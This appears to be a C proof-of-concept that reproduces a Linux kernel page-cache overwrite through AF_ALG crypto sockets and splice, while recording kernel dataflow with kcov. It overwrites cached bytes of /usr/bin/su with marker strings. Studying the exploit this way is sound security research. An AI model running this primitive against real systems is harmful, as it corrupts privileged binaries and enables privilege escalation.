#define _GNU_SOURCE
/*
 * copy_fail_poc.c — Minimal C reproduction of https://copy.fail/exp
 * Records kcov-dataflow during AF_ALG + splice page cache attack.
 *
 * Essential kernel paths exercised:
 *   1. crypto: AF_ALG socket → setsockopt → accept → sendmsg
 *   2. splice: open(target) → pipe → splice(file→pipe) → splice(pipe→alg)
 *
 * Build: gcc -static -o copy_fail_poc copy_fail_poc.c
 * Run:   ./copy_fail_poc  (with kcov_dataflow enabled)
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/if_alg.h>

#define KCOV_DF_INIT_TRACE  _IOR('d', 1, unsigned long)
#define KCOV_DF_ENABLE      _IO('d', 100)
#define KCOV_DF_DISABLE     _IO('d', 101)
#define BUF_SIZE            (512 << 10)

/* One iteration of the splice-via-crypto attack */
static void attack_iteration(int target_fd, off_t offset, const char *payload, int pay_len)
{
    int alg_fd, op_fd, pipefd[2];
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };

    /* 1. Create AF_ALG socket */
    alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) { fprintf(stderr, "socket(AF_ALG): %m\n"); return; }

    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        { fprintf(stderr, "bind: %m\n"); goto out_alg; }

    /* 2. Set crypto key (64-byte key) */
    char key[72];
    memset(key, 0, sizeof(key));
    key[0] = 0x08; key[4] = 0x10;  /* key header */
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0)
        goto out_alg;

    /* Set auth size */
    uint32_t authsize = 4;
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, authsize) < 0)
        fprintf(stderr, "setsockopt(AUTHSIZE): %m\n");

    /* 3. Accept to get operation fd */
    op_fd = accept(alg_fd, NULL, NULL);
    if (op_fd < 0) { fprintf(stderr, "accept: %m\n"); goto out_alg; }

    /* 4. sendmsg with crypto control messages */
    char cbuf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)];
    memset(cbuf, 0, sizeof(cbuf));
    char iov_buf[64];
    memset(iov_buf, 'A', 4);
    if (pay_len > 60) pay_len = 60;
    memcpy(iov_buf + 4, payload, pay_len);

    struct iovec iov = { .iov_base = iov_buf, .iov_len = 4 + pay_len };
    struct msghdr msg = {
        .msg_iov = &iov, .msg_iovlen = 1,
        .msg_control = cbuf, .msg_controllen = sizeof(cbuf),
        .msg_flags = MSG_MORE
    };

    /* ALG_SET_OP (encrypt) */
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(4);
    *(uint32_t *)CMSG_DATA(cmsg) = 0;

    /* ALG_SET_IV */
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(20);
    *(uint32_t *)CMSG_DATA(cmsg) = 16; /* iv len */

    /* ALG_SET_AEAD_ASSOCLEN */
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len = CMSG_LEN(4);
    *(uint32_t *)CMSG_DATA(cmsg) = 8;

    sendmsg(op_fd, &msg, MSG_MORE);

    /* 5. pipe + splice: file → pipe → crypto socket */
    if (pipe(pipefd) < 0) goto out_op;

    loff_t off = offset;
    splice(target_fd, &off, pipefd[1], NULL, offset + 4, 0);
    splice(pipefd[0], NULL, op_fd, NULL, offset + 4, 0);

    /* 6. recv triggers the crypto operation */
    char recv_buf[64];
    recv(op_fd, recv_buf, sizeof(recv_buf), 0);

    close(pipefd[0]);
    close(pipefd[1]);
out_op:
    close(op_fd);
out_alg:
    close(alg_fd);
}

int main(void)
{
    /* === Setup kcov_dataflow === */
    int df_fd = open("/sys/kernel/debug/kcov_dataflow", O_RDWR);
    if (df_fd < 0) { perror("open kcov_dataflow"); return 1; }

    if (ioctl(df_fd, KCOV_DF_INIT_TRACE, (unsigned long)BUF_SIZE))
        { perror("INIT"); return 1; }
    uint64_t *buf = mmap(NULL, BUF_SIZE * 8, PROT_READ|PROT_WRITE,
                         MAP_SHARED, df_fd, 0);
    if (buf == MAP_FAILED) { perror("mmap"); return 1; }

    if (ioctl(df_fd, KCOV_DF_ENABLE, 0)) { perror("ENABLE"); return 1; }
    __atomic_store_n(&buf[0], 0, __ATOMIC_RELAXED);

    /* === Execute the attack === */
    int target = open("/usr/bin/su", O_RDONLY);
    if (target < 0) target = open("/bin/su", O_RDONLY);
    if (target < 0) target = open("/usr/bin/id", O_RDONLY);
    if (target < 0) { perror("open target"); goto done; }

    /* Attack: overwrite 3 chunks at offsets 0, 4, 8 */
    const char p1[] = "\x7f" "ELF";
    const char p2[] = "PWND";
    const char p3[] = "HACK";
    attack_iteration(target, 0, p1, 4);
    attack_iteration(target, 4, p2, 4);
    attack_iteration(target, 8, p3, 4);

    close(target);

done:
    /* === Dump results === */
    ;
    uint64_t n = __atomic_load_n(&buf[0], __ATOMIC_RELAXED);
    ioctl(df_fd, KCOV_DF_DISABLE, 0);

    fprintf(stderr, "Captured %lu words (%lu records approx)\n", n, n/4);

    uint64_t i = 1;
    unsigned count = 0;
    while (i + 3 <= n && i < BUF_SIZE) {
        uint64_t type_seq = buf[i];
        uint64_t pc = buf[i+1];
        uint64_t meta = buf[i+2];
        uint32_t type = (type_seq >> 28) & 0xF;
        uint32_t seq = type_seq & 0x00FFFFFF;
        uint32_t arg_idx = (meta >> 56) & 0xFF;
        uint32_t sz = (meta >> 48) & 0xFF;
        printf("[%s] seq=%u pc=0x%lx arg[%u] sz=%u val=0x%lx\n",
               type == 0xE ? "ENTRY" : "RET  ",
               seq, pc, arg_idx, sz, buf[i+3]);
        i += 4;
        count++;
    }
    fprintf(stderr, "Dumped %u records\n", count);

    munmap(buf, BUF_SIZE * 8);
    close(df_fd);
    return 0;
}
